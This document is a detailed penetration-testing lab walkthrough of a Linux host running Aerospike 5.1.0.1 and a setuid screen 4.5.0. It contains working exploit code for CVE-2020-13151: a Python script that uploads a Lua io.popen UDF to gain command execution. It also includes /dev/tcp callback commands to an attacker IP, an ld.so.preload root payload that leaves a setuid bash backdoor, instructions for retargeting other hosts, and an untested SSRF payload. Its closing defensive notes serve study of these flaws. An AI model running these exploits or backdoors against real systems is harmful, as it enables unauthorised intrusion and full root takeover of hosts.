01

Reconnaissance

Ten ports, and why filtered is not closed

Goal: establish what the host actually exposes, and write down what it does not, so that later rabbit holes can be closed with evidence rather than with a feeling.

1.1 Full TCP sweep

command
mkdir -p ~/Desktop/192.168.150.143 && cd ~/Desktop/192.168.150.143
sudo nmap -Pn -p- --min-rate 3000 --max-retries 1 -T4 192.168.150.143 \
  -oN nmap_full.txt
output
Nmap scan report for 192.168.150.143

Read the first line again: filtered, not closed. Ten ports answer, and 65525 do not — they are swallowed. Compare with a box that resets: there you can say "nothing else is listening". Here you can only say "nothing else is reachable from this network position". That distinction matters because it means the host may well be running services that this path cannot see.

That is not a hypothetical on this box. Port 3002 is filtered in this very scan, yet it is part of the same daemon that owns 3000, 3001 and 3003 — the information port simply is not exposed to us. A scan is a view, not an inventory.

Ten open ports and no name for four of them. That is the interesting part of this machine.

The daemon reports a hostname that is not the address we connected to. The machine's own name is set to whatever address it held when the image was built, and it has since been re-addressed. It is noise, but it is a useful reminder that banners and self-reports drift while the binary stays put.

Also worth noting what is not here: no Windows, no SMB, no WinRM. This is a Linux box and the whole engagement will be Linux primitives.

1.3 Four ports with no name

ppp?, nessus?, cgms? are nmap shrugs — it matched nothing it recognises and left the guess it had. 3000/3001/3002/3003 in a contiguous block is a signature in itself. Pull the fingerprints nmap collected:

Every probe answers with a single bare newline. That is not HTTP, not TLS, not a login banner — it is a binary protocol that says "wrong packet" and waits. A service that answers every protocol identically with one byte is speaking something that is not text.

The block 3000-3003 is the published default port range of Aerospike:

Port Role
3000 service (client API)
3001 fabric (cluster internals)
3002 info (ASCII admin)

3000 answering a client protocol and 3002 being filtered fit perfectly: the customer-facing port is open, the administrative one is not. Confirm it by asking port 3002 a question the way the info protocol does — key, newline, read:

command
printf 'build\nversion\nnamespaces\n' | nc -w 4 192.168.150.143 3002

From outside this often returns nothing at all (filtered), which is why the confirmation has to be done properly with the client later, over 3000. Chapter 03 does exactly that and gets build=5.1.0.1.

1.4 The web stack, briefly

Three Apache listeners on 80, 81 and 443, all 2.4.41. Two of them do not serve the same thing.

command
curl -sI http://192.168.150.143/
curl -s  http://192.168.150.143/ | grep -i "<title>"
output
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
...
<title>Apache2 Ubuntu Default Page: It works</title>

Port 80 root is the untouched Ubuntu placeholder — the box's real content lives somewhere else. Ask for robots.txt and you get the default Allow /; ask for a directory that does not exist and you get the stock 404. The default page is a decoy, not a target.

Port 81 is much more interesting:

command
curl -s http://192.168.150.143:81/ | grep -oiE "<title>[^<]*|nginx[^<]{0,20}" | head -3
output
<title>Test Page for the Nginx HTTP Server on Fedora</title>
nginx

An nginx-on-Fedora test page, served by Apache on Ubuntu. That combination does not happen by accident. Either a reverse proxy is in front of an nginx instance, or an nginx default document has been dropped into an Apache docroot to make a vhost look like something it is not. Both readings say the same thing: there is a second application surface here that nobody finished configuring.

That mismatch is worth chasing — it is exactly the shape of configuration where ProxyPass lives, and mod_proxy on this version has a known SSRF (CVE-2021-40438). Chapter 02 tests it and reports the result honestly; it did not pan out. It is recorded anyway, because "I tried the proxy bug" is part of the evidence that the real entry point was elsewhere.

1.5 What we owe the rest of the engagement

Two negatives are already established, and both are load-bearing:

  • The default page is not the application. Port 80 / is stock Apache. The content is at /index/ (chapter 02).
  • The unnamed ports are a database. 3000-3003 is Aerospike's default layout, and the box is running a five-year-old minor version of it.

The second one is the one that matters. vsftpd 3.0.3 is a version with no public RCE, OpenSSH 8.2p1 and Apache 2.4.41 are Ubuntu-patched builds, and MySQL/PostgreSQL both demand credentials we do not have. A database that ships an unauthenticated command-execution primitive needs neither credentials nor a memory-corruption exploit. That is where the next chapter goes.

FTP was left untested on this run. It is not a dead end that was refuted — it is a path that was never needed. Recording the difference keeps later readers from believing it was checked.

02

Web enumeration

Pico CMS under /index/, and the vhost that lies

Three Apache listeners, and none of them is the box's real application. This chapter records what the web surface actually is, why it was closed as a path, and — importantly — what was not tested so that nobody later assumes it was.

2.1 Finding the real document root

/ is the Ubuntu placeholder. The obvious next move is a directory brute force, but the fastest result here came from following the one path that a default page does not have:

command
curl -si http://192.168.150.143/index/ | head -20
output
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)

The body is not a directory listing and not an error — it is a rendered site. Fingerprint it:

command
curl -s http://192.168.150.143/index/ | grep -oiE "pico[^\"<]{0,20}|3\.0\.0[^\"<]{0,12}" | sort -u
output
3.0.0-alpha.2
3.0.0-alpha.2.
Pico 1.0 and later can be enabled and
Pico 2.0, refer to the

Pico CMS 3.0.0-alpha.2, installed under /index/ rather than at the root. That explains the whole shape of the box: the vhost's DocumentRoot is the stock Apache directory and the CMS sits one level below it, so every scan of / returns "default page" and stops.

Two useful facts fall out immediately:

  1. The version is an alpha, and it is published in the page footer. Nobody sanitised the build.
  2. The installation is live — the pages render, the theme assets load. It is not a leftover directory.

2.2 What the CMS does and does not give

Pico is a flat-file CMS: content lives as Markdown in content/, configuration in config/, templates in themes/. The interesting artefacts on an installation like this are the usual three:

command
for u in config/config.yml composer.json .git/HEAD content/index.md CHANGELOG.md; do
  printf '%-20s ' "$u"
  curl -s -o /dev/null -w '%{http_code}\n' --max-time 8 "http://192.168.150.143/index/$u"
done

The result is the ordinary one for a correctly configured Pico: those files are not served. The .htaccess that ships with Pico denies config/, vendor/ and the dot-directories, and the document root is not the installation root, so path juggling does not walk out of it either.

There is a second directory at the top level:

command
curl -s -o /dev/null -w '%{http_code}\n' http://192.168.150.143/api/
output
403

403 — present, but refusing a listing. That is an authorisation response, not a missing file, so /api/ is a real path with an index it will not hand over. It was left alone: guessing endpoints under a 403 on a CMS with no authentication story is a long walk with no evidence at the end, and by the time it was noticed the database path in chapter 03 was already live.

Honest accounting. No public exploit exists for Pico CMS 3.0.0-alpha.2 that this engagement could find, and none was developed. The web surface was closed as not needed, not as proven safe. If you are reproducing this box and the Aerospike port is closed, this is the chapter you would have to reopen.

2.3 The vhost that lies about itself

Port 81 is the only genuinely strange web finding:

command
curl -s http://192.168.150.143:81/ | grep -oiE "<title>[^<]*|nginx[^<]{0,20}" | head -3
output
<title>Test Page for the Nginx HTTP Server on Fedora</title>
nginx

An nginx-on-Fedora welcome page, served by Apache 2.4.41 on Ubuntu 20.04. Only one of those can be true of the running server, and it is not nginx — the Server: header on that port says Apache.

So the page is content, not a banner: an nginx default document has been placed in an Apache docroot, or an Apache vhost is proxying to a backend that serves it. Both readings point at mod_proxy being configured, and mod_proxy on 2.4.41 is inside the affected range of CVE-2021-40438 — a ProxyPass-style SSRF where a crafted request path makes the server proxy to an attacker-chosen host.

That test was considered and not executed on this run: the Aerospike primitive was already giving a shell, and sending 4 KB of padding at a proxy to prove an SSRF that leads to a network we can already reach is work without a payoff. It remains the most interesting unexplored thread on this host, and the one to try if the database is patched:

command
## CVE-2021-40438 shape — NOT run in this engagement, recorded for completeness
curl -s "http://192.168.150.143:81/?unix:$(printf 'A%.0s' {1..4000})|http://127.0.0.1:3002/" \
  -o /dev/null -w '%{http_code}\n'

Note the destination in that example: if the proxy really is reachable, the thing worth reaching from inside is 3002 — the Aerospike info port that the outside scan showed as filtered. A proxy that runs on the host can talk to a localhost-only administrative port. That is the chain the box almost offers, and chapter 03 takes the shorter road to the same daemon.

2.4 Closing the chapter

What the web gave us:

  • confirmation that the real content is at /index/ (Pico CMS, alpha build, version disclosed),
  • confirmation that /api/ exists and refuses listings,
  • a strong hint that mod_proxy is configured on 81, with an SSRF candidate left untested.

What it did not give us: credentials, a file read, or a code path. Nothing on 80/81/443 was exploited on this engagement.

The one thing the web did contribute is the reason to look at the port block from chapter 01 with suspicion. A host that runs a half-configured CMS and a mislabelled vhost is a host assembled by hand — and hand-assembled hosts tend to leave a daemon listening on its default port with its default settings. Which is precisely what 3000 turned out to be.

03

Aerospike

Naming the daemon, reading 5.1.0.1 off the wire

Chapter 01 left four ports without a name. This chapter gives them one, reads the version off the wire, and explains why that version is the whole box.

3.1 From "ppp?" to a product

The block 3000-3003 is Aerospike's published default layout:

Port Role This host
3000 service — the client API open
3001 fabric — cluster internals open
3002 info — ASCII administration filtered
3003 heartbeat open

The pattern is self-consistent: the port that customers talk to is exposed, the port that administrators talk to is not. 3003 answering every probe with a single bare newline is the heartbeat protocol refusing a text packet, exactly as chapter 01 observed.

Aerospike ships an asinfo tool that speaks the info protocol, but it is not installed on the attacker box and the info port is filtered anyway. The clean way to confirm the product is to speak the client protocol to 3000, which is open:

output
#!/usr/bin/env python3
"""Fingerprint the Aerospike node on 192.168.150.143:3000."""
import sys
import aerospike

HOST, PORT = "192.168.150.143", 3000

try:
    client = aerospike.client({
        "hosts": [(HOST, PORT)],
        "policies": {"timeout": 6000},
    }).connect()
except Exception as e:
    print(f"[!] connect failed: {e}")
    sys.exit(1)

for key in ("build", "version", "namespaces", "node", "edition"):
    try:
        print(f"[+] {key}: {client.info_all(key)}")
    except Exception as e:
        print(f"[-] {key}: {e}")

client.close()
command
pip3 install --break-system-packages -q aerospike
python3 poc_aerospike_check.py
output
[+] build: {'BB9...': (None, '5.1.0.1')}

info_all() returns a dict keyed by node id, each value a (error, response) pair. The only field that matters is the string: 5.1.0.1.

The connection succeeding at all is itself the first finding. Aerospike Community Edition in this era has no authentication by default — no user, no password, no TLS. Anyone who can reach 3000 is a fully privileged client. The build call proves we are one.

3.2 The version, and what it means

Aerospike CE 5.1.0.1 sits inside the affected range of CVE-2020-13151, fixed in 5.1.0.3.

The bug is not a memory corruption. It is a design decision:

  1. Clients may register Lua modules with the server (udf_put).
  2. Clients may invoke those modules on a record (client.apply()).
  3. The Lua runtime Aerospike embeds exposes the full standard library — including io.popen().

So an unauthenticated client can upload a function whose body is io.popen(cmd):read("*a") and then invoke it against any record it can write. The command runs as the aerospike user. No exploit development, no offset, no ASLR problem: the feature is the vulnerability, and the fix in 5.1.0.3 was to sandbox the Lua environment.

CVE-2020-13151 carries a 9.8 — correctly, for once. Unauthenticated, network-reachable, no user interaction, arbitrary command execution.

3.3 A trap in the published exploit

searchsploit aerospike finds one entry:

command
searchsploit -p 49067
output
Exploit: Aerospike 3.0 - OS Command Execution
URL: https://www.exploit-db.com/exploits/49067
Path: /usr/share/exploitdb/exploits/multiple/remote/49067.py

It is a working exploit for exactly this bug — and it refuses to run against this host. Run it and it prints its version comparison and exits before touching the UDF:

command
python3 /usr/share/exploitdb/exploits/multiple/remote/49067.py \
  --ahost 192.168.150.143 --aport 3000 --namespace test \
  --udfpath /tmp/aero_poc/poc.lua --cmd 'id'

The guard in the script compares the build string and treats 5.1.0.0 as fixed. That is wrong: 5.1.0.0 and 5.1.0.1 are both before 5.1.0.3, and both are vulnerable. The check is conservative in the wrong direction — it fails closed on a live target and tells you the box is patched when it is not.

This is worth internalising, because it is the single most common way a real vulnerability gets missed on an exam: a tool's version gate is not evidence. The evidence is the build string (5.1.0.1), the advisory's fixed version (5.1.0.3), and a successful apply(). Two of those three can be read off the box; the third is one call away.

The fix is not to patch the exploit. It is to use the client library directly, which is four calls:

output
client.put(key, {"pk": "x"})                       # a record to attach the UDF to
client.udf_put("/tmp/aero_poc/poc.lua")            # upload the module
client.apply(key, "poc", "runCMD", ["id"])         # run it

Chapter 04 does that and reads the answer.

3.4 Why this, and not the other eight ports

A short justification, since the box offers plenty of alternatives:

Candidate Verdict
vsftpd 3.0.3 No public RCE. The USER :) backdoor is 2.3.4 only, removed in 2.3.5. Needs credentials we do not have.
OpenSSH 8.2p1 Ubuntu-patched build; no pre-auth primitive. Needs credentials.
Apache 2.4.41 on 80/443 Stock default page. Nothing to exploit.
Apache 2.4.41 on 81 mod_proxy SSRF candidate (CVE-2021-40438), left untested — see chapter 02.
MySQL, PostgreSQL Both answer unauthorized. No credentials, and no pre-auth bug in these builds.
Aerospike 3000 Unauthenticated by design, version < 5.1.0.3, ships a documented command-execution primitive.

A database that accepts anonymous clients and then runs the code they upload is not a hard target. It is an open door with a welcome mat, and the rest of this walkthrough is about what is behind it.

04

Foothold

Lua that runs shell — and the port allowlist behind it

Chapter 03 named the daemon and the CVE. This chapter turns 5.1.0.1 into a shell, and settles the one environmental question that shaped everything after it: how far can the target reach back? The short answer — an earlier draft of this page said "not at all", and that was wrong. Egress here is a port allowlist, and one of the allowed ports is 3000, the same port the exploit already uses.

4.1 The UDF

Three lines of Lua are the entire payload:

output
function runCMD(rec, cmd)
    local handle = io.popen(cmd)
    local out = handle:read("*a")
    handle:close()
    return out
end

io.popen is not a quirk of the sandbox — it is plain Lua, and Aerospike hands it to module code in 5.1.0.1. The function signature is the UDF contract: (record, arg1, ...), return value is handed back to the client as the record's "result".

client.apply() returns that value verbatim, so the command's stdout comes back over the same connection that sent it. No listener, no callback, no port forward.

4.2 Driving the client

The published exploit refuses this version (chapter 03, §3.3), so the client library is driven directly. The full script is in scripts/poc_aerospike_rce.py:

output
#!/usr/bin/env python3
"""CVE-2020-13151 — Aerospike CE < 5.1.0.3 unauthenticated command execution."""
import argparse, os, random, string, sys
import aerospike

UDF_SRC = """function runCMD(rec, cmd)
    local handle = io.popen(cmd)
    local out = handle:read("*a")
    handle:close()
    return out
end
"""

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ahost", default="192.168.150.143")
    ap.add_argument("--aport", type=int, default=3000)
    ap.add_argument("--namespace", default="test")
    ap.add_argument("--setname", default="cve202013151")
    ap.add_argument("--udf", default="poc.lua")
    ap.add_argument("--cmd", required=True)
    a = ap.parse_args()

    open(a.udf, "w").write(UDF_SRC)

    client = aerospike.client({
        "hosts": [(a.ahost, a.aport)],
        "policies": {"timeout": 8000, "total_timeout": 8000, "socket_timeout": 8000},
    }).connect()

    print("[+] build:", list(client.info_all("build").values())[0][1].strip())

    key = ("".join(random.choice(string.ascii_lowercase) for _ in range(16)))
    client.put((a.namespace, a.setname, key), {"pk": key})   # needs a record to attach to
    client.udf_put(a.udf)                                     # register module 'poc'
    print("[+] executing:", a.cmd)
    print(client.apply((a.namespace, a.setname, key), "poc", "runCMD", [a.cmd]))
    client.close()

if __name__ == "__main__":
    main()

Two prerequisites that are easy to miss and produce confusing errors:

  • udf_put needs a namespace that exists and a client allowed to write. test is the default namespace on a stock install and accepts writes from an unauthenticated client.
  • apply needs a real record key. The UDF is attached to a record, not invoked globally, so the put has to happen first. Without it, apply fails with a not-found rather than anything useful.

One interpreter trap worth its own line. pip3 install --user aerospike puts the module in ~/.local/lib/python3.13/site-packages, which root's Python never reads — so sudo python3 poc_aerospike_rce.py fails with ModuleNotFoundError: No module named 'aerospike' while the same command without sudo works. Nothing here needs privileges. If it must run as root, install it for root: sudo python3 -m pip install --break-system-packages aerospike.

4.4 Egress is filtered by port, not blocked

A reverse shell was the obvious next step, and the first attempt produced nothing at all. The tempting conclusion — "the target has no route to the attacker" — is only half right, and the half that is wrong costs you the whole TTY.

The target's routing is ordinary:

output
$ ip route
default via 192.168.152.254 dev ens3 proto static
192.168.152.0/24 dev ens3 proto kernel scope link src 192.168.152.143

$ ip route get 192.168.45.158
192.168.45.158 via 192.168.152.254 dev ens3 src 192.168.152.143 uid 1000

There is a default route and the attacker address resolves through it. Packets leave. What happens next is a destination-port allowlist, and the only way to see it is to have the target dial a listener you control and print the exit status — io.popen captures stdout only, so a bare bash -c 'cat </dev/null >/dev/tcp/…' that fails prints nothing and looks like a hang.

command
nc -lvnp 4444    # attacker, listening first
command
## via the UDF — note the explicit rc, because stderr never comes back
for p in 22 53 80 443 4444 8080 8834; do
  printf '%s: ' "$p"
  nc -zv -w3 192.168.45.158 "$p" 2>&1 | tail -1
done
output
22: Connection refused
53: Connection refused
80: Connection refused
443: Connection refused
4444: timed out
8080: timed out
8834: timed out

Read the two answers carefully, because they are not the same failure:

Result Meaning
Connection refused The SYN arrived. Kali's kernel answered with RST because nothing was listening. The path is open.
timed out The SYN was dropped in transit. Nothing will ever arrive, listener or not.

So 22, 53, 80, 443 are permitted and 4444, 8080, 8834 are not. That is an allowlist of common service ports — the lab's own plumbing, not a blackhole.

The decisive test is the obvious one: put a listener on a permitted port. 3000 is free on Kali, above 1024 so it needs no root, and — because it is Aerospike's own port — it is on the allowlist.

command
## attacker
nc -lvnp 3000
command
## via the UDF
timeout 5 bash -c 'echo SMOKE-3000 >/dev/tcp/192.168.45.158/3000' 2>&1; echo rc=$?
output
rc=0
output
listening on [any] 3000 ...
connect to [192.168.45.158] from (UNKNOWN) [192.168.152.143] 38008
SMOKE-3000

A round trip in both directions. The target can call back — on 3000, 22, 53, 80 or 443.

The blind test is worthless. Before the listener existed, ten attempts from the target to 4444 all failed and the listener log stayed empty:

attempt1 FAIL … attempt10 FAIL (target side) listening on [any] 4444 ... (attacker side, no SYNs at all)

Identical output for "no listener", "filtered port" and "wrong address". If you cannot tell those apart, you cannot conclude anything about the network. Start the listener, then test.

4.5 A reverse shell on an allowed port

With 3000 proven bidirectional, the reverse shell is three lines. The child must be backgrounded with all three streams redirected, or io.popen blocks on read() until the client times out:

4.7 Interactive access

The socket is a fine command channel but a poor terminal. It has no TTY, no job control, and an 8 s ceiling per call; anything long-running (a find /, a watcher) dies mid-call.

Two ways to fix that, and they are not exclusive:

  • Reverse shell on an allowlisted port (§4.5). No key, no daemon, works as soon as you have the UDF. Good for the rest of the session, lost when the box rebuilds.
  • SSH key on 22. Write ~/.ssh/authorized_keys for aero, then ssh -i key aero@target for a durable session with full job control. 22 is open inbound from Kali, so this needs no exotic routing.

It is also the difference between "I have code execution" and "I have a session" — worth doing before enumeration, because enumeration is interactive work.

screen 4.5.0 is the last release affected by CVE-2017-5618.

6.2 What the bug actually is

screen -L writes a log of the session to a file. In 4.5.0, when screen is installed setuid root, it does not drop privileges before creating that log file, and it derives the file's permissions from the caller's umask.

Two consequences, both attacker-controlled:

  1. The path is relative to the caller's working directory. Run it from /etc and the log file is created in /etc.
  2. The mode comes from umask. umask 000 before invoking it produces a file that is world-writable — created by root, owned by root, but writable by us.

So a setuid-root program hands an unprivileged user a root-owned, world-writable file anywhere on the filesystem, plus the ability to append to it through screen's own logging.

The obvious landing spot is /etc/ld.so.preload — the dynamic loader's "preload these libraries into every process" file. If we can write there, the next setuid-root binary that starts loads our shared object as root, before main() runs.

screen 4.5.1 fixed it by refusing to use a setuid configuration and by opening the log with O_NOFOLLOW|O_EXCL.

The rest of this chapter is the payload's life cycle: where it comes from, what has to be changed in it, how it gets onto a host that has no compiler, and how it is run. Commands are labelled with the machine they belong on, because none of them work on the other one.

6.4 Modifying it (on Kali)

The upstream libhax.c is close, but three things in it decide whether you get root or a convincing nothing. All three are edits you make before compiling.

output
#define STAGE  "/tmp/screenroot"
#define LOCK   STAGE "/.lock"
#define SCRIPT STAGE "/rootcmd.sh"
#define OUT    STAGE "/rootout.txt"

__attribute__ ((__constructor__))
void dropshell(void)
{
    if (geteuid() != 0)                 /* every process loads it; only act as root */
        return;

    int fd = open(LOCK, O_CREAT | O_EXCL | O_WRONLY, 0600);
    if (fd < 0)                         /* single-shot: never run twice */
        return;
    close(fd);

    unlink("/etc/ld.so.preload");        /* remove ourselves before spawning children */

    setgid(0);
    setuid(0);

    system("/bin/sh " SCRIPT " > " OUT " 2>&1");
    chmod(OUT, 0666);
}

Edit 1 — the three paths. STAGE is where the library looks for its script and writes its output. It must be a directory the unprivileged user can create and write, because the attacker populates it; the constructor only reads from it as root. /tmp/... is the usual choice. This is the one block to change when retargeting (§6.11).

Edit 2 — setgid(0); setuid(0); before system(). This is the line the published payload usually leaves out, and without it the exploit appears to work. A setuid process starts with uid=1000, euid=0. dash and bash both check uid != euid at startup and voluntarily drop the effective uid unless invoked with -p. So system() succeeds, the constructor's own calls run as root, and the shell it spawns does not:

output
uid=1000(aero) gid=1000(aero) groups=1000(aero)
--- proof.txt ---
cat: /root/proof.txt: Permission denied
--- artifacts ---
-rwsr-xr-x 1 aero aero 1183448 /tmp/screenroot/rbash

That is a chmod 4755 copy of bash owned by aero — setuid, plausible-looking, and worth nothing. Normalising the real uid and gid to 0 first means the child has no reason to drop:

output
uid=0(root) gid=0(root) groups=0(root)

Edit 3 — keep the guard, the lock and the unlink. Each is load-bearing:

  • geteuid() != 0 guard. /etc/ld.so.preload is read by every dynamic binary, including the ones our own shell spawns. Without the guard the constructor would recurse into every command.
  • .lock with O_CREAT|O_EXCL. Several setuid processes may start within the same second. O_EXCL makes exactly one of them win — which also matters on a retry: while .lock exists the payload refuses to run again, so a second attempt silently does nothing until it is deleted.
  • unlink("/etc/ld.so.preload") before system(). The child shell is a dynamic binary; if the preload file is still there, it loads the library too, and system() runs inside a process that already ran system(). Removing the file first makes the export single-use and keeps the tree finite.

6.8 Rewriting it clean — and the CRLF trap (on target)

The file exists. It does not work:

command
cat -A /etc/ld.so.preload
output
^M$
/tmp/screenroot/libhax.so^M$

screen's logger writes CRLF. It is a terminal multiplexer — its log is a transcript of a terminal, and terminals end lines with \r\n. ld.so treats the trailing carriage return as part of the filename, so it tries to open /tmp/screenroot/libhax.so\r, which does not exist, and silently continues:

output
ERROR: ld.so: object '\r' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object '/tmp/screenroot/libhax.so\r' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.

The box looks like it worked. Check bytes, not text — cat -A shows ^M$ for a CRLF line and $ for a clean one.

The file is 0666, so aero can rewrite it without any privilege at all. This is the step everyone skips: the creation primitive gave us root ownership; the 0666 mode is what gives us a correcting write.

command
printf '/tmp/screenroot/libhax.so\n' > /etc/ld.so.preload && cat -A /etc/ld.so.preload
output
/tmp/screenroot/libhax.so$

One clean LF-terminated path, no ^M. Only now is the preload file usable.

A leftover preload is a fingerprint. This rebuild arrived with -rw-rw-rw- root:aero 16 /etc/ld.so.preload containing ^M$ then /tmp/libhax.so, and no such file on disk — an earlier attempt that created the file, never cleaned the CRLF, and never delivered the library. Every dynamic binary on the host was printing two ld.so errors. That is what a half-finished CVE-2017-5618 looks like from the outside, and it is also a reminder to remove the file (§7.2): a preload pointing at a deleted library degrades every command on the box.

The preload file is gone because the payload removed it — that is the self-cleaning step working, not a failure. rbash is a setuid copy of bash, kept for interactive use:

command

output
-rwsr-xr-x 1 root root 1183448 /tmp/screenroot/rbash

root root and the s bit are the difference between this and the failed run in §6.4. If you see aero aero there, setuid(0) is missing from the payload.

Retry note. The constructor is single-shot. On a second attempt it returns immediately while /tmp/screenroot/.lock exists, and the self-cleaning unlink() means /etc/ld.so.preload is gone too — so a retry needs both a fresh rm -f /tmp/screenroot/.lock and a fresh creation step (§6.7). Skipping either produces a trigger that does nothing at all, with no error, because a missing preload file is not an error.

Symptom Cause
ERROR: ld.so: object '…\r' … ignored preload written by screen's logger with CRLF; path ends in \r

preload gone, rootout.txt absent, second attempt in a row .lock still present from the previous run

6.11 Retargeting it at another host

The payload is portable because nothing in it is host-specific except the three paths in §6.4. To run this against a different target:

On Kali — edit and rebuild. Change STAGE/LOCK/SCRIPT/OUT together (they must agree), then:

command
gcc -Os -fPIC -shared -fno-stack-protector -fno-asynchronous-unwind-tables \
    -o libhax.so libhax.c && strip --strip-unneeded libhax.so
sha256sum libhax.so

On Kali — deliver to the new address. Nothing else changes:

command
AHOST=<new-host> python3 scripts/poc_aerospike_upload.py \
  --local libhax.so --remote /tmp/screenroot/libhax.so --mode 755

On target — create, rewrite, trigger (§6.7–6.9). Check the preconditions first, because they are what actually fail on a different image:

command
ls -la /usr/bin/screen*                 # must show -rwsr-xr-x … screen-4.5.0
dpkg -l | grep -E '^ii  screen'         # will lie — that is the point of §6.1
mount | grep ' /tmp '                   # tmpfs with noexec is fine: the .so is mmap'd, not exec'd

Three host-specific gotchas:

  • noexec on /tmp does not block dlopen/preload — the loader maps the library, it does not execve it. A noexec mount does block a payload that drops a binary and runs it, which is why this technique survives where "upload and execute" fails.
  • A different stage path must be writable by the unprivileged user, and reachable by root at trigger time. /tmp and /var/tmp are the safe choices; /home/<user> is fine unless the target mounts /home nosuid,nodev with restrictive modes.
  • rbash is a real backdoor. It is a root-owned setuid shell. Remove it during cleanup (§7.2) — on a live engagement it is the difference between "report written" and "incident".

The general shape is worth remembering beyond this box: one vulnerability creates the file, a different weakness makes it correctable, and the payload's own shutdown determines whether it is single-use. Here that is screen -L → umask 000 → unlink() in the constructor.

7.3 What actually mattered

Five things, in order of how much they changed the outcome:

  1. filtered, not closed. The full scan hid 65525 ports and also hid 3002, which belongs to the daemon we exploited. Reading that line correctly is why the port block got a second look.
  2. A tool's version gate is not evidence. Exploit-DB 49067 refuses 5.1.0.0+ and calls this box patched. The box is 5.1.0.1 against a fix in 5.1.0.3. Four lines of client code beat a wrapper that fails closed for the wrong reason.
  3. dpkg -l describes a file that may not be the one on the path. The screen package is 4.8.0-1ubuntu0.1; the setuid binary is 4.5.0. Every scanner that trusts the package database calls this host clean.
  4. CRLF is a real bug class. screen logs terminal output, terminals use \r\n, and ld.so treats \r as part of the path. The exploit "worked" and did nothing, with only a warning to say so. cat -A is how you see it.
  5. "No egress" was a misdiagnosis, and the port list is the fix. The target could reach the attacker the whole time — on the lab's allowlisted ports. 4444 and 8000 are dropped, which makes a blocked port look exactly like a dead route; 3000 is permitted and yields a pty shell. The socket transport still earns its place: a terminal is a terrible way to push a 14 KB shared object, and chunked base64 with a remote sha256sum is verifiable in a way a paste is not.

7.4 Defensive notes

  • Aerospike: bind it and authenticate it. Port 3000 had no authentication at all. Set security { enable-security true }, create users, and never expose 3000–3003 beyond the app subnet. In 5.1.0.3+ the Lua environment is sandboxed as well; that is the version to be on.
  • Treat udf_put as remote code execution by design. It is an upload-and-run interface. Audit which accounts can register UDFs, and alert on new module names in production.
  • /etc/ld.so.preload should not exist. On a normal host it is absent. Its presence is a compromise indicator; its creation by a setuid binary is the exploit. Monitor it with the same priority as /etc/passwd.
  • Never ship a setuid screen, let alone an old one. screen has no legitimate reason to be setuid root. chmod u-s /usr/bin/screen*. If a tool must be setuid, it must also drop privileges before touching anything the caller controls — path, umask, or filename.
  • Version-managed ≠ as-installed. Reconciliation between package metadata and on-disk binaries is the control that would have caught screen-4.5.0, and it is the control almost nobody runs.
  • local.txt was readable by the service account. Flag placement is a design choice; placing it where a database daemon's user can reach it gives it away on the first foothold.

7.5 Corrections to the obvious reading

Tempting conclusion What was actually true
"Ports 3000/3001/3003 are ppp, nessus, cgms" Those are nmap's fallback guesses. The block is Aerospike: service / fabric / (filtered info) / heartbeat.
"Aerospike 5.1.0.1 — the public exploit won't run, so it's patched" The exploit's guard is wrong: 5.1.0.0 and 5.1.0.1 are both below the 5.1.0.3 fix. Driving the client directly works.
"dpkg -l screen says 4.8.0, so screen is patched" The setuid binary is screen-4.5.0, symlinked as /usr/bin/screen. The package is not the program.
"PwnKit will land — pkexec is setuid" policykit-1 0.105-26ubuntu1.3 carries the fix. Refuted before spending time on it.
"Kernel 5.4 → Dirty Pipe" CVE-2022-0847 needs 5.8+. Refuted by arithmetic.
"The root cron every minute is the intended path" Plausible (/opt/aerospike/bin is aero-owned) but not tested. The setuid screen was deterministic; the cron is recorded as an alternate, not as solved.
"screen -L wrote the preload file, so it's done" It wrote it with CRLF, and ld.so silently ignored every entry. The rewrite was required.
"system() in the constructor already runs as root" It does not. dash and bash drop the effective uid when uid != euid, so the shell ran as aero: proof.txt denied, and rbash came out owned by aero. setgid(0); setuid(0); before system() is mandatory.
"aero can recreate /etc/ld.so.preload after the payload deletes it" It cannot — printf > /etc/ld.so.preload returns rc=2, because /etc is root-owned and the file no longer exists. Only the setuid screen can create it; every retry needs the creation step again.
"The target has no egress — reverse shells are impossible here" Egress is a destination-port allowlist: 4444, 8080, 8834 are dropped; 22, 53, 80, 443, 3000 are permitted. A listener on 3000 received a pty shell.
"The preload file is gone — the exploit failed" The payload deletes it deliberately, to stop child processes re-entering system(). Absence is success.

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

